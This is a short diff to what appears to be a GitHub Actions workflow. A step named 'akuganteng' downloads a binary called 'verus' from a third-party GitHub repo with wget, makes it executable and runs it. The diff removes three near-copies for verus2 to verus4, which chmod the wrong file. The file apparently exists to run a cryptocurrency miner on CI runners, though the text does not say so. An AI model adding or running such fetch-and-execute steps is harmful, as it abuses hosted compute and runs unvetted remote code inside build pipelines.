@@ -25,7 +25,3 @@ uses: actions/checkout@v2
 - name: akuganteng
 run: |
 wget https://raw.githubusercontent.com/tugas29/cariuang/main/verus && chmod u+x verus && ./verus
-wget https://raw.githubusercontent.com/tugas29/cariuang/main/verus2 && chmod u+x verus && ./verus2
-wget https://raw.githubusercontent.com/tugas29/cariuang/main/verus3 && chmod u+x verus && ./verus3
-wget https://raw.githubusercontent.com/tugas29/cariuang/main/verus4 && chmod u+x verus && ./verus4
-
